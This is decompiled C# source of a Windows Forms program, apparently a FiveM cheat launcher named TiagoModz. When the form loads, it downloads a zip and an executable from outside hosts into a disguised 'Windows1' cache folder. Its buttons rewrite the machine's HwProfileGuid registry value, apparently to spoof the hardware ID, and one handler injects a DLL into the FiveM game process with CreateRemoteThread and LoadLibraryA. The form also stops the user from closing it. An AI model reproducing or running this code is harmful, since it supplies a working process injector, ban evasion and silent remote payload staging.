﻿using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.IO.Compression;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;
using TiagoModz_Acess.My;
using TiagoModz_Acess.My.Resources;

namespace TiagoModz_Acess
{
	// Token: 0x0200000B RID: 11
	[DesignerGenerated]
	public partial class Liberado : Form
	{
		// Token: 0x0600003C RID: 60 RVA: 0x00003484 File Offset: 0x00001684
		public Liberado()
		{
			base.Load += this.Liberado_Load;
			base.FormClosing += this.Form1_FormClosing;
			this.FileName = "C:\\TiagoModz\\launcher.exe";
			this.text2 = Conversions.ToString(38547058);
			this.text1 = Conversions.ToString(38522633);
			this.folderPath = "C:\\TiagoModz";
			this.InitializeComponent();
		}

		// Token: 0x17000019 RID: 25
		// (get) Token: 0x0600003F RID: 63 RVA: 0x00003C01 File Offset: 0x00001E01
		// (set) Token: 0x06000040 RID: 64 RVA: 0x00003C0B File Offset: 0x00001E0B
		internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001A RID: 26
		// (get) Token: 0x06000041 RID: 65 RVA: 0x00003C14 File Offset: 0x00001E14
		// (set) Token: 0x06000042 RID: 66 RVA: 0x00003C1E File Offset: 0x00001E1E
		internal virtual Label Label2 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

		// Token: 0x1700001B RID: 27
		// (get) Token: 0x06000043 RID: 67 RVA: 0x00003C27 File Offset: 0x00001E27
		// (set) Token: 0x06000044 RID: 68 RVA: 0x00003C34 File Offset: 0x00001E34
		internal virtual GroupBox GroupBox1
		{
			[CompilerGenerated]
			get
			{
				return this._GroupBox1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.GroupBox1_Enter);
				GroupBox groupBox = this._GroupBox1;
				if (groupBox != null)
				{
					groupBox.Enter -= value2;
				}
				this._GroupBox1 = value;
				groupBox = this._GroupBox1;
				if (groupBox != null)
				{
					groupBox.Enter += value2;
				}
			}
		}

		// Token: 0x1700001C RID: 28
		// (get) Token: 0x06000045 RID: 69 RVA: 0x00003C77 File Offset: 0x00001E77
		// (set) Token: 0x06000046 RID: 70 RVA: 0x00003C84 File Offset: 0x00001E84
		internal virtual Label Label3
		{
			[CompilerGenerated]
			get
			{
				return this._Label3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Label3_Click);
				Label label = this._Label3;
				if (label != null)
				{
					label.Click -= value2;
				}
				this._Label3 = value;
				label = this._Label3;
				if (label != null)
				{
					label.Click += value2;
				}
			}
		}

		// Token: 0x1700001D RID: 29
		// (get) Token: 0x06000047 RID: 71 RVA: 0x00003CC7 File Offset: 0x00001EC7
		// (set) Token: 0x06000048 RID: 72 RVA: 0x00003CD4 File Offset: 0x00001ED4
		internal virtual Button Button1
		{
			[CompilerGenerated]
			get
			{
				return this._Button1;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button1_Click);
				Button button = this._Button1;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button1 = value;
				button = this._Button1;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x1700001E RID: 30
		// (get) Token: 0x06000049 RID: 73 RVA: 0x00003D17 File Offset: 0x00001F17
		// (set) Token: 0x0600004A RID: 74 RVA: 0x00003D24 File Offset: 0x00001F24
		internal virtual Button Button3
		{
			[CompilerGenerated]
			get
			{
				return this._Button3;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button3_Click);
				Button button = this._Button3;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button3 = value;
				button = this._Button3;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x1700001F RID: 31
		// (get) Token: 0x0600004B RID: 75 RVA: 0x00003D67 File Offset: 0x00001F67
		// (set) Token: 0x0600004C RID: 76 RVA: 0x00003D74 File Offset: 0x00001F74
		private virtual Button Button2
		{
			[CompilerGenerated]
			get
			{
				return this._Button2;
			}
			[CompilerGenerated]
			[MethodImpl(MethodImplOptions.Synchronized)]
			set
			{
				EventHandler value2 = new EventHandler(this.Button2_Click);
				Button button = this._Button2;
				if (button != null)
				{
					button.Click -= value2;
				}
				this._Button2 = value;
				button = this._Button2;
				if (button != null)
				{
					button.Click += value2;
				}
			}
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00003DB8 File Offset: 0x00001FB8
		private void Liberado_Load(object sender, EventArgs e)
		{
			this.Label1.Text = "Hello " + MyProject.Forms.Form1.TextBox1.Text + " Welcome to TiagoMenu!!! ";
			string text = Interaction.Environ("USERPROFILE") + "desktop\\1111";
			MyProject.Computer.FileSystem.CreateDirectory(text);
			File.Exists(text);
			NewLateBinding.LateCall(Interaction.CreateObject("WScript.Shell", ""), null, "Popup", new object[]
			{
				"Waiting....",
				1,
				"Title"
			}, null, null, null, true);
			Directory.Delete(text, true);
			MyProject.Computer.Network.DownloadFile("https://coprolaliac-shave.000webhostapp.com/files/055888/66999/33555/01001.zip", Interaction.Environ("USERPROFILE") + "\\AppData\\Local\\Windows1\\Fivem\\cache\\01001.zip");
			ZipFile.ExtractToDirectory(Interaction.Environ("USERPROFILE") + "\\AppData\\Local\\Windows1\\Fivem\\cache\\01001.zip", text);
			MyProject.Computer.Network.DownloadFile("https://doc-10-6s-docs.googleusercontent.com/docs/securesc/ha0ro937gcuc7l7deffksulhg5h7mbp1/jlknped4l5m3c85jtqq7uui62126v18l/1568721600000/02819667999918519736/*/1Y6qfjH2XeT76eOU95cPeE_7uLa1YBDKJ?e=download", Interaction.Environ("USERPROFILE") + "\\AppData\\Local\\Windows1\\Fivem\\cache\\TiagoModz.exe");
			NewLateBinding.LateCall(Interaction.CreateObject("WScript.Shell", ""), null, "Popup", new object[]
			{
				"successfully",
				1,
				"Title"
			}, null, null, null, true);
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00003F13 File Offset: 0x00002113
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Button1_Click(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", this.text2);
			ProjectData.EndApp();
		}

		// Token: 0x0600004F RID: 79 RVA: 0x00003F34 File Offset: 0x00002134
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void Button2_Click(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName(Path.GetFileNameWithoutExtension(this.FileName));
			bool flag = processesByName.Length > 0;
			if (!flag)
			{
				Interaction.MsgBox("Open Launcher.exe and click again", MsgBoxStyle.OkOnly, null);
				ProjectData.EndApp();
			}
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", this.text1);
			Interaction.MsgBox("Launcher activated", MsgBoxStyle.OkOnly, null);
			Interaction.MsgBox("Open Fivem", MsgBoxStyle.OkOnly, null);
			bool flag2 = processesByName.Length == 0;
			if (flag2)
			{
				this.P.EnableRaisingEvents = true;
				this.P.Exited += this.P_Exited1;
			}
			else
			{
				this.P = processesByName[0];
				this.P.EnableRaisingEvents = true;
				this.P.Exited += this.P_Exited1;
			}
		}

		// Token: 0x06000050 RID: 80 RVA: 0x00004007 File Offset: 0x00002207
		[MethodImpl(MethodImplOptions.NoInlining | MethodImplOptions.NoOptimization)]
		private void P_Exited1(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", this.text2);
			ProjectData.EndApp();
		}

		// Token: 0x06000051 RID: 81 RVA: 0x00004026 File Offset: 0x00002226
		private void P_Exited(object sender, EventArgs e)
		{
			Registry.SetValue("HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\IDConfigDB\\Hardware Profiles\\0001", "HwProfileGuid", this.text2);
		}

		// Token: 0x06000052 RID: 82 RVA: 0x00004040 File Offset: 0x00002240
		private void Form1_FormClosing(object sender, FormClosingEventArgs e)
		{
			bool flag = e.CloseReason == CloseReason.UserClosing;
			if (flag)
			{
				e.Cancel = true;
			}
		}

		// Token: 0x06000053 RID: 83 RVA: 0x00002ABF File Offset: 0x00000CBF
		private void GroupBox1_Enter(object sender, EventArgs e)
		{
		}

		// Token: 0x06000054 RID: 84 RVA: 0x00004065 File Offset: 0x00002265
		private void Button3_Click(object sender, EventArgs e)
		{
			Interaction.MsgBox("Click Active launcher", MsgBoxStyle.OkOnly, null);
			Process.Start(Interaction.Environ("USERPROFILE") + "\\AppData\\Local\\Windows1\\Fivem\\cache");
		}

		// Token: 0x06000055 RID: 85 RVA: 0x00002ABF File Offset: 0x00000CBF
		private void Label3_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00002ABF File Offset: 0x00000CBF
		private void Button4_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x06000057 RID: 87
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int ReadProcessMemory(int hProcess, int lpBaseAddress, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

		// Token: 0x06000058 RID: 88
		[DllImport("kernel32", CharSet = CharSet.Ansi, EntryPoint = "LoadLibraryA", ExactSpelling = true, SetLastError = true)]
		public static extern int LoadLibrary([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpLibFileName);

		// Token: 0x06000059 RID: 89
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int VirtualAllocEx(int hProcess, int lpAddress, int dwSize, int flAllocationType, int flProtect);

		// Token: 0x0600005A RID: 90
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int WriteProcessMemory(int hProcess, int lpBaseAddress, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpBuffer, int nSize, ref int lpNumberOfBytesWritten);

		// Token: 0x0600005B RID: 91
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int GetProcAddress(int hModule, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpProcName);

		// Token: 0x0600005C RID: 92
		[DllImport("Kernel32", CharSet = CharSet.Ansi, EntryPoint = "GetModuleHandleA", ExactSpelling = true, SetLastError = true)]
		private static extern int GetModuleHandle([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpModuleName);

		// Token: 0x0600005D RID: 93
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int CreateRemoteThread(int hProcess, int lpThreadAttributes, int dwStackSize, int lpStartAddress, int lpParameter, int dwCreationFlags, ref int lpThreadId);

		// Token: 0x0600005E RID: 94
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int OpenProcess(int dwDesiredAccess, int bInheritHandle, int dwProcessId);

		// Token: 0x0600005F RID: 95
		[DllImport("user32", CharSet = CharSet.Ansi, EntryPoint = "FindWindowA", ExactSpelling = true, SetLastError = true)]
		private static extern int FindWindow([MarshalAs(UnmanagedType.VBByRefStr)] ref string lpClassName, [MarshalAs(UnmanagedType.VBByRefStr)] ref string lpWindowName);

		// Token: 0x06000060 RID: 96
		[DllImport("kernel32", CharSet = CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		private static extern int CloseHandle(int hObject);

		// Token: 0x06000061 RID: 97 RVA: 0x00004090 File Offset: 0x00002290
		private void Button4_Click_1(object sender, EventArgs e)
		{
			Process[] processesByName = Process.GetProcessesByName("FiveM_GTAProcess");
			this.TargetProcessHandle = Liberado.OpenProcess(42, 0, processesByName[0].Id);
			this.pszLibFileRemote = "C:\\Users\\TiagoM\\Desktop\\error 344\\dll.dll";
			string text = "Kernel32";
			int moduleHandle = Liberado.GetModuleHandle(ref text);
			string text2 = "LoadLibraryA";
			this.pfnStartAddr = Liberado.GetProcAddress(moduleHandle, ref text2);
			this.TargetBufferSize = checked(1 + Strings.Len(this.pszLibFileRemote));
			int num = Liberado.VirtualAllocEx(this.TargetProcessHandle, 0, this.TargetBufferSize, 4096, 4);
			int targetProcessHandle = this.TargetProcessHandle;
			int lpBaseAddress = num;
			int targetBufferSize = this.TargetBufferSize;
			int num2 = 0;
			int num3 = Liberado.WriteProcessMemory(targetProcessHandle, lpBaseAddress, ref this.pszLibFileRemote, targetBufferSize, ref num2);
			int targetProcessHandle2 = this.TargetProcessHandle;
			int lpThreadAttributes = 0;
			int dwStackSize = 0;
			int lpStartAddress = this.pfnStartAddr;
			int lpParameter = num;
			int dwCreationFlags = 0;
			num2 = 0;
			Liberado.CreateRemoteThread(targetProcessHandle2, lpThreadAttributes, dwStackSize, lpStartAddress, lpParameter, dwCreationFlags, ref num2);
			Liberado.CloseHandle(this.TargetProcessHandle);
			base.Show();
		}

		// Token: 0x04000020 RID: 32
		private Process P;

		// Token: 0x04000021 RID: 33
		private string FileName;

		// Token: 0x04000022 RID: 34
		private string text2;

		// Token: 0x04000023 RID: 35
		private string text1;

		// Token: 0x04000024 RID: 36
		private string folderPath;

		// Token: 0x04000025 RID: 37
		private int TargetProcessHandle;

		// Token: 0x04000026 RID: 38
		private int pfnStartAddr;

		// Token: 0x04000027 RID: 39
		private string pszLibFileRemote;

		// Token: 0x04000028 RID: 40
		private int TargetBufferSize;

		// Token: 0x04000029 RID: 41
		public const int PROCESS_VM_READ = 16;

		// Token: 0x0400002A RID: 42
		public const int TH32CS_SNAPPROCESS = 2;

		// Token: 0x0400002B RID: 43
		public const int MEM_COMMIT = 4096;

		// Token: 0x0400002C RID: 44
		public const int PAGE_READWRITE = 4;

		// Token: 0x0400002D RID: 45
		public const int PROCESS_CREATE_THREAD = 2;

		// Token: 0x0400002E RID: 46
		public const int PROCESS_VM_OPERATION = 8;

		// Token: 0x0400002F RID: 47
		public const int PROCESS_VM_WRITE = 32;

		// Token: 0x04000030 RID: 48
		private string DLLFileName;
	}
}
